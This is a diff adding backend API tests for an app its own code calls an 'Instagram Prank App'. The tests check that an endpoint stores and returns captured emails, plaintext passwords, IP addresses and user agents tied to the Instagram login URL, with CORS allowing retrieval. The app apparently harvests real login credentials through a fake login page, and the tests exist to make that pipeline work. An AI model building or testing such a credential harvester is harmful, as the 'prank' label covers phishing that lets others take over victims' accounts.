@@ -461,6 +461,203 @@ def test_multiple_entries():
         print(f"   ❌ Only {success_count}/{len(test_users)} entries saved successfully")
         return False
 
+def test_get_pranked_credentials_endpoint():
+    """
+    Test the GET /api/pranked-credentials endpoint as per review request:
+    1) Ensure it returns [] when backend/pranked_user.json is missing or empty
+    2) After creating 2 entries via POST /api/save-prank-credentials, confirm it returns an array with those 2 entries and expected fields
+    3) Check CORS and 200 status
+    """
+    print("\n🧪 Testing GET /api/pranked-credentials endpoint (Review Request)")
+    
+    pranked_user_file = Path("/app/backend/pranked_user.json")
+    
+    # Test 1: Missing file should return empty array
+    print("   Test 1: Missing file should return []")
+    if pranked_user_file.exists():
+        pranked_user_file.unlink()
+        print("   ✅ Removed existing file")
+    
+    try:
+        response = requests.get(f"{API_BASE_URL}/pranked-credentials")
+        print(f"   Status Code: {response.status_code}")
+        
+        if response.status_code != 200:
+            print(f"   ❌ Expected 200, got {response.status_code}")
+            return False
+        
+        data = response.json()
+        print(f"   Response: {data}")
+        
+        if data != []:
+            print(f"   ❌ Expected empty array [], got {data}")
+            return False
+        
+        print("   ✅ Missing file returns empty array correctly")
+        
+    except Exception as e:
+        print(f"   ❌ Error testing missing file: {str(e)}")
+        return False
+    
+    # Test 2: Empty file should return empty array
+    print("   Test 2: Empty file should return []")
+    try:
+        with open(pranked_user_file, 'w') as f:
+            f.write("")
+        
+        response = requests.get(f"{API_BASE_URL}/pranked-credentials")
+        print(f"   Status Code: {response.status_code}")
+        
+        if response.status_code != 200:
+            print(f"   ❌ Expected 200, got {response.status_code}")
+            return False
+        
+        data = response.json()
+        print(f"   Response: {data}")
+        
+        if data != []:
+            print(f"   ❌ Expected empty array [], got {data}")
+            return False
+        
+        print("   ✅ Empty file returns empty array correctly")
+        
+    except Exception as e:
+        print(f"   ❌ Error testing empty file: {str(e)}")
+        return False
+    
+    # Test 3: Create 2 entries via POST and verify GET returns them
+    print("   Test 3: Create 2 entries via POST and verify GET returns them")
+    
+    # Remove file to start fresh
+    if pranked_user_file.exists():
+        pranked_user_file.unlink()
+    
+    # Create first entry
+    entry1 = {
+        "email": "review_test_1@example.com",
+        "password": "testpass123",
+        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "url": "https://www.instagram.com/accounts/login/",
+        "prankedAt": datetime.now().isoformat(),
+        "timestamp": int(time.time() * 1000)
+    }
+    
+    try:
+        response1 = requests.post(
+            f"{API_BASE_URL}/save-prank-credentials",
+            json=entry1,
+            headers={"Content-Type": "application/json"}
+        )
+        
+        if response1.status_code != 200:
+            print(f"   ❌ Failed to create first entry: {response1.status_code}")
+            return False
+        
+        print("   ✅ Created first entry")
+        
+    except Exception as e:
+        print(f"   ❌ Error creating first entry: {str(e)}")
+        return False
+    
+    # Create second entry
+    entry2 = {
+        "email": "review_test_2@example.com",
+        "password": "testpass456",
+        "userAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "url": "https://www.instagram.com/accounts/login/",
+        "prankedAt": datetime.now().isoformat(),
+        "timestamp": int(time.time() * 1000)
+    }
+    
+    try:
+        response2 = requests.post(
+            f"{API_BASE_URL}/save-prank-credentials",
+            json=entry2,
+            headers={"Content-Type": "application/json"}
+        )
+        
+        if response2.status_code != 200:
+            print(f"   ❌ Failed to create second entry: {response2.status_code}")
+            return False
+        
+        print("   ✅ Created second entry")
+        
+    except Exception as e:
+        print(f"   ❌ Error creating second entry: {str(e)}")
+        return False
+    
+    # Test 4: GET should now return array with 2 entries
+    print("   Test 4: GET should return array with 2 entries and expected fields")
+    
+    try:
+        response = requests.get(f"{API_BASE_URL}/pranked-credentials")
+        print(f"   Status Code: {response.status_code}")
+        
+        if response.status_code != 200:
+            print(f"   ❌ Expected 200, got {response.status_code}")
+            return False
+        
+        data = response.json()
+        print(f"   Response length: {len(data)}")
+        
+        if not isinstance(data, list):
+            print(f"   ❌ Expected array, got {type(data)}")
+            return False
+        
+        if len(data) != 2:
+            print(f"   ❌ Expected 2 entries, got {len(data)}")
+            return False
+        
+        # Verify expected fields in each entry
+        required_fields = ["id", "emailOrUsername", "password", "ipAddress", "userAgent", "url", "prankedAt", "timestamp"]
+        
+        for i, entry in enumerate(data):
+            missing_fields = [field for field in required_fields if field not in entry]
+            if missing_fields:
+                print(f"   ❌ Entry {i+1} missing fields: {missing_fields}")
+                return False
+            print(f"   ✅ Entry {i+1}: {entry['emailOrUsername']} has all required fields")
+        
+        # Verify the entries match what we created
+        emails_in_response = [entry['emailOrUsername'] for entry in data]
+        expected_emails = ["review_test_1@example.com", "review_test_2@example.com"]
+        
+        for email in expected_emails:
+            if email not in emails_in_response:
+                print(f"   ❌ Expected email {email} not found in response")
+                return False
+        
+        print("   ✅ GET returns correct array with 2 entries and all expected fields")
+        
+    except Exception as e:
+        print(f"   ❌ Error testing GET with 2 entries: {str(e)}")
+        return False
+    
+    # Test 5: Check CORS headers on GET request
+    print("   Test 5: Check CORS headers on GET request")
+    
+    try:
+        response = requests.get(
+            f"{API_BASE_URL}/pranked-credentials",
+            headers={"Origin": "http://localhost:3000"}
+        )
+        
+        cors_origin = response.headers.get("Access-Control-Allow-Origin")
+        print(f"   CORS Origin Header: {cors_origin}")
+        
+        if cors_origin not in ["*", "http://localhost:3000"]:
+            print(f"   ❌ CORS header not properly configured: {cors_origin}")
+            return False
+        
+        print("   ✅ CORS headers configured correctly for GET request")
+        
+    except Exception as e:
+        print(f"   ❌ Error testing CORS headers: {str(e)}")
+        return False
+    
+    print("   ✅ All GET /api/pranked-credentials endpoint tests passed!")
+    return True
+
 def main():
     """Run all backend tests"""
     print("🚀 Starting Instagram Prank App Backend API Tests")
@@ -472,6 +669,9 @@ def main():
     
     # Run all tests
     test_results.append(("Root Endpoint", test_root_endpoint()))
+    
+    # NEW: Test GET /api/pranked-credentials endpoint as per review request
+    test_results.append(("GET Pranked Credentials Endpoint (Review)", test_get_pranked_credentials_endpoint()))
     
     # Run comprehensive pranked_user.json test (covers the review requirements)
     test_results.append(("Pranked User JSON Functionality (Review)", test_pranked_user_json_functionality()))
